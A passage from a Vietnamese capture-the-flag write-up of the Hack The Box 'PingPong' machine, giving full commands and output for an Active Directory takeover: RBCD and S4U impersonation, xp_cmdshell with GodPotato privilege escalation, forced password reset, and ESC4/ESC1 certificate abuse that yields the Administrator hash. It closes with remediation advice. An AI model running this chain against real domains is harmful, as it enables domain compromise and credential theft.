Enter-pssession -computername dc2.pong.htb -credential $c
<SNIP>
```

Cậu này có WinRM vào DC2, user flag khả năng cao ở đây rồi:

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=c.carlssen.ccache
~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache -M whoami
LDAP        DC2             389    DC2              [*] None (name:DC2) (domain:PONG.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC2             389    DC2              [+] PONG.HTB\c.carlssen from ccache
WHOAMI      DC2             389    DC2              Name: C.Carlssen
WHOAMI      DC2             389    DC2              sAMAccountName: C.Carlssen
WHOAMI      DC2             389    DC2              Enabled: Yes
WHOAMI      DC2             389    DC2              Password Never Expires: Yes
WHOAMI      DC2             389    DC2              Last logon: 2026-06-01 00:30:19 UTC
WHOAMI      DC2             389    DC2              Password Last Set: 2026-01-20 16:32:49 UTC
WHOAMI      DC2             389    DC2              Bad Password Count: 0
WHOAMI      DC2             389    DC2              Distinguished Name: CN=C.Carlssen,CN=Users,DC=pong,DC=htb
WHOAMI      DC2             389    DC2              Member of: CN=IT Service Admins,CN=Users,DC=pong,DC=htb
WHOAMI      DC2             389    DC2              Member of: CN=Remote Management Users,CN=Builtin,DC=pong,DC=htb
WHOAMI      DC2             389    DC2              User SID: S-1-5-21-2410575906-3092493790-2123333151-1110
```

Quẵm user flag:

```bash
~/HTB/Windows/PingPong $ winrmexec.py DC2 -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] '-target_ip' not specified, using DC2
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://DC2:5985/wsman
[*] using domain and username from ccache: PONG.HTB\c.carlssen
[*] '-spn' not specified, using HTTP/DC2@PONG.HTB
[*] '-dc-ip' not specified, using PONG.HTB
[*] requesting TGS for HTTP/DC2@PONG.HTB
PS C:\Users\C.Carlssen\Documents> cat ..\Desktop\user.txt
191e97d3c9a1942b7d44b944c760b382
```

## 8. Lạm dụng ACL tiến tới RBCD

BloodyAD yêu dấu cho thấy `c.carlssen` có quyền write không rõ ràng lên các tài khoản dịch vụ nằm trong OU `Service Accounts`.

```bash
~/HTB/Windows/PingPong $ bloodyad -k -d pong.htb -H DC2.pong.htb get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=C.Carlssen,CN=Users,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_sql,OU= ,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_print,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE

distinguishedName: DC=pong.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.pong.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD
```

Mình check lại cho chuẩn bằng module daclread của NetExec, xác nhận đó là quyền WriteProperties:

```bash
~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache -M daclread -o target=svc_sql | grep -B 7 "IT Service Admins"
DACLREAD                 DC2             389    DC2                 Object type (GUID)        : Web-Information (e45795b3-9455-11d1-aebd-0000f80367c1)
DACLREAD                 DC2             389    DC2                 Trustee (SID)             : Principal Self (S-1-5-10)
DACLREAD                 DC2             389    DC2              ACE[19] info
DACLREAD                 DC2             389    DC2                 Access mask               : FullControl, Modify, ReadAndExecute, ReadAndWrite, Read, Write, WriteDACL, Delete, ListObject, WriteProperties, Self, CreateChild (0xf01ff)
DACLREAD                 DC2             389    DC2                 Trustee (SID)             : Domain Admins (S-1-5-21-2410575906-3092493790-2123333151-512)
DACLREAD                 DC2             389    DC2              ACE[20] info
DACLREAD                 DC2             389    DC2                 Access mask               : ReadControl, WriteProperties, Self (0x20028)
DACLREAD                 DC2             389    DC2                 Trustee (SID)             : IT Service Admins (S-1-5-21-2410575906-3092493790-2123333151-1108)
```

> Mình rất lười dùng BloodHound nên BloodyAD và NetExec là 2 cặp bài enum attack path rất tuyệt vời trong hầu hết box.

Thử targeted Kerberoasting cả 3 cái tài khoản dịch vụ này đều thất bại nên mình phải suy nghĩ sắc bén hơn.
Trong AD, một dịch vụ không có một thực thể mặc định mà phải mượn xác của một user để hoạt động. Có lẽ MSSQL vẫn luôn chờ sự đồng ý của AD thông qua sắc lệnh SPN gán lên `svc_sql`.
Ta có toàn quyền edit thuộc tính của `svc_sql`, bao gồm SPN và cả.. `msDS-AllowedToActOnBehalfOfOtherIdentity`. Ta tự do viết sắc lệnh nói rằng: `svc_sql` phải cho phép `Pong_gMSA$` truy cập tới dịch vụ MSSQL trên danh nghĩa của bất kỳ ai.

> Chọn tài khoản máy `Pong_gMSA$` để RBCD cho dễ.

Sửa SPN trỏ tới MSSQL sau đó thêm RBCD:

```bash
~/HTB/Windows/PingPong $ bloodyad -k -d pong.htb -H DC2.pong.htb set object svc_sql servicePrincipalName -v mssqlsvc/DC2
[+] svc_sql's servicePrincipalName has been updated
~/HTB/Windows/PingPong $ bloodyad -k -d pong.htb -H DC2.pong.htb add rbcd svc_sql pong_gmsa$
[!] No security descriptor has been returned, a new one will be created
[+] pong_gmsa$ can now impersonate users on svc_sql via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+ccache://pong.htb\None:c.carlssen.ccache@DC2.pong.htb/?serverip=192.168.2.2&dc=192.168.2.2' 'HOST/svc_sql@pong.htb' 'Administrator@pong.htb'
```

Oof! `Administrator` không cho delegate rồi, chắc phải có ai đó khác quản lý MSSQL.

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=pong_gmsa\$.ccache
~/HTB/Windows/PingPong $ getST.py pong.htb/pong_gmsa$ -k -no-pass -spn mssqlsvc/DC2 -impersonate administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user pong_gmsa$ or initial TGT not forwardable
```

Dạo quanh khu rừng thì tìm được 2 người thuộc nhóm `Database Admins`, mục tiêu đã được xác định.

```bash
~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache --groups
<SNIP>
LDAP        DC2             389    DC2              gMSA Managers                            1
LDAP        DC2             389    DC2              IT Service Admins                        3
LDAP        DC2             389    DC2              Database Admins                          2
LDAP        DC2             389    DC2              SQLServer2005SQLBrowserUser$DC2          0         Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.
~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache --groups "database admins"
LDAP        DC2             389    DC2              [*] None (name:DC2) (domain:PONG.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC2             389    DC2              [+] PONG.HTB\pong_gmsa$ from ccache
LDAP        DC2             389    DC2              C.Adam
LDAP        DC2             389    DC2              P.Reiner
~/HTB/Windows/PingPong $ getST.py pong.htb/pong_gmsa$ -k -no-pass -spn mssqlsvc/DC2 -impersonate c.adam
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating c.adam
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in c.adam@mssqlsvc_DC2@PONG.HTB.ccache
```

## 9. MSSQL SeImpersonatePrivilege

Với danh tính dbo trong tay ta mở luôn xp_cmdshell:

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=c.adam@mssqlsvc_DC2@PONG.HTB.ccache
~/HTB/Windows/PingPong $ mssqlclient.py DC2 -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC2): Line 1: Changed database context to 'master'.
[*] INFO(DC2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (pong\C.Adam  dbo@master)> enable_xp_cmdshell
INFO(DC2): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC2): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
``

Những tài khoản này thường xuyên có SeImpersonatePrivilege, và không ngoại lệ ở đây:

```bash
SQL (pong\C.Adam  dbo@master)> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Nhặt khoai tây bằng GodPotato thui!

```bash
SQL (pong\C.Adam  dbo@master)> upload /home/luverie/ADKit/Potato/GodPotato-NET4.exe C:\Users\svc_sql\GodPotato-NET4.exe
[+] Data length (b64-encoded): 74.67 KB with MD5: 1fdb1dd742674d3939f636c3fc4b761f
[+] Uploading...
[+] Uploaded
[+] certutil -decode "C:\Users\svc_sql\GodPotato-NET4.exe.b64" "C:\Users\svc_sql\GodPotato-NET4.exe"
[+] del "C:\Users\svc_sql\GodPotato-NET4.exe.b64"
[+] certutil -hashfile "C:\Users\svc_sql\GodPotato-NET4.exe" MD5
[+] MD5 hashes match
SQL (pong\C.Adam  dbo@master)> xp_cmdshell C:\Users\svc_sql\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators c.carlssen /add"
output
--------------------------------------------------------------------------------
[*] CombaseModule: 0x140709320392704
[*] DispatchTable: 0x140709322979656
[*] UseProtseqFunction: 0x140709322272288
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\6378d3ed-ea03-49cf-b045-a9edda43cbfc\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000b402-0e94-ffff-9d0e-56f3274d5478
[*] DCOM obj OXID: 0x91e538a87e0fec8a
[*] DCOM obj OID: 0xc3979d92cba7a4ba
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 880 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2656
The command completed successfully.
```

`PONG.HTB` đã chính thức thất thủ.

## 10. Kẻ nhập tịch

Khám xét kỹ lưỡng khu rừng mình tìm thấy một dòng SID trong danh sách thành viên nhóm `CA Managers` thay vì sAMAccoutName:

```bash
~/HTB/Windows/PingPong $ nxc ldap DC1 -k --use-kcache --groups "ca managers"
LDAP        DC1             389    DC1              [*] None (name:DC1) (domain:PONG.HTB) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC1             389    DC1              [+] PONG.HTB\c.carlssen from ccache
LDAP        DC1             389    DC1              S-1-5-21-2410575906-3092493790-2123333151-1124
LDAP        DC1             389    DC1              P.Paul
LDAP        DC1             389    DC1              M.Wallace
```

Hỏi DC2 tên thật của nó thì hóa ra là người rừng bên `r.martinelli`:

```bash
~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache --query "(objectSid=S-1-5-21-2410575906-3092493790-2123333151-1124)" name
LDAP        DC2             389    DC2              [*] None (name:DC2) (domain:PONG.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC2             389    DC2              [+] PONG.HTB\c.carlssen from ccache
LDAP        DC2             389    DC2              [+] Response for object: CN=R.Martinelli,CN=Users,DC=pong,DC=htb
LDAP        DC2             389    DC2              name                 R.Martinelli
```

Cướp xác luôn để nhảy về quê:

```bash
~/HTB/Windows/PingPong $ bloodyad -k -d pong.htb -H DC2.pong.htb set password r.martinelli Password123
[+] Password changed successfully!
~/HTB/Windows/PingPong $ getTGT.py pong.htb/r.martinelli:Password123
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in r.martinelli.ccache
```

`CA Managers` cứ tưởng là manage cả CA, nhưng đây chỉ được động vào một cái template duy nhất tên `SmartcardAuthentication` thôi, thế là quá đủ đánh bay `PING.HTB`.

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=r.martinelli.ccache
~/HTB/Windows/PingPong $ bloodyad -k -d pong.htb -H DC1.ping.htb get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-21-2410575906-3092493790-2123333151-1124,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
permission: WRITE

distinguishedName: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
permission: WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: DC=ping.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.ping.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD
```

## 11. ESC4 & Root flag

Thêm genericAll như mọi khi:

```bash
~/HTB/Windows/PingPong $ bloodyad -k -d pong.htb -H DC1.ping.htb add genericAll "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb" c.roberts
[+] c.roberts has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
```

Mở lỗ hổng ESC1 cho template bằng cờ có sẵn của Certipy:

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=c.roberts.ccache
~/HTB/Windows/PingPong $ certipy template -k -target DC1.ping.htb -template SmartcardAuthentication -write-default-configuration
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC1.ping.htb.
[!] Use -debug to print a stacktrace
[*] Saving current configuration to 'SmartcardAuthentication.json'
[*] Wrote current configuration for 'SmartcardAuthentication' to 'SmartcardAuthentication.json'
[*] Updating certificate template 'SmartcardAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SmartcardAuthentication'? (y/N): y
[*] Successfully updated 'SmartcardAuthentication'
```

Nhẹ nhàng vớt cái chức chúa sơn lâm thôi:

```bash
~/HTB/Windows/PingPong $ certipy req -k -target DC1.ping.htb -ca ping-DC1-CA -template SmartcardAuthentication -upn administrator -sid S-1-5-21-750635624-2058721901-1932338391-500
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC1.ping.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: PING.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
~/HTB/Windows/PingPong $ certipy auth -pfx administrator.pfx -dc-ip 10.129.245.56 -domain ping.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Using principal: 'administrator@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
```

Hai rừng đã cùng nhau nằm lại dưới chân kẻ tấn công. Kho báu cuối cùng đã được khai mở:

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=administrator.ccache
~/HTB/Windows/PingPong $ winrmexec.py DC1 -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] '-target_ip' not specified, using DC1
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://DC1:5985/wsman
[*] using domain and username from ccache: PING.HTB\administrator
[*] '-spn' not specified, using HTTP/DC1@PING.HTB
[*] '-dc-ip' not specified, using PING.HTB
[*] requesting TGS for HTTP/DC1@PING.HTB
PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
7a27a8f0d5ac603319cfe517b085c7af
```

## Khắc phục

### ADCS
- **ESC13:** đừng gắn issuance policy (OID) vào một nhóm có đặc quyền. Gỡ liên kết OID group trên template `TemporaryWinRM`, hoặc siết lại quyền enroll. Định kỳ quét template bằng Certipy hoặc Locksmith.
- **ESC4:** chỉ `Domain Admins`/`Enterprise Admins` được ghi lên template, gỡ ACL thừa trên `SmartcardAuthentication`. Bật manager approval cho template nhạy cảm.

### Trust
- Trust Bidirectional Forest Transitive là con dao 2 lưỡi. Nếu không thực sự cần quyền truy cập toàn rừng thì chuyển sang Selective Authentication để chặn user hai bên tự do xác thực sang nhau.
- Audit các foreign security principal nằm trong nhóm nhạy cảm (`CA Managers`, `gMSA Managers`). Không để user của rừng khác đứng trong nhóm quyền cao.
- Theo dõi thay đổi thuộc tính `groupType`: việc một Security Group bị đổi scope sang Domain Local gần như luôn là dấu hiệu lạm dụng để nhét foreign SID.

### Bảo vệ user quyền to.
- Đưa `Administrator` và các tài khoản nhạy cảm vào nhóm `Protected Users`, hoặc đặt cờ "Account is sensitive and cannot be delegated". Chính nhờ cấu hình kiểu này mà bước S4U impersonate `administrator` đã fail. Nên làm tương tự cho `c.adam` và nhóm `Database Admins`.

### JEA
- Dùng `LanguageMode = NoLanguage` thay vì `ConstrainedLanguage`.
- Chặn các Provider không cần thiết và chỉ expose đúng cmdlet cần qua RoleCapabilities.

### MSSQL
- Tắt `xp_cmdshell`. Chạy SQL Server dưới tài khoản quyền tối thiểu.
- Gỡ `SeImpersonatePrivilege` khỏi những service account không thật sự cần nó và giữ hệ thống được vá đầy đủ.

### Vệ sinh chung
- Không gõ mật khẩu plaintext vào PowerShell vì nó nằm lại trong `ConsoleHost_history.txt` của PSReadLine. Xóa file history cũ và dùng cách truyền cred an toàn.
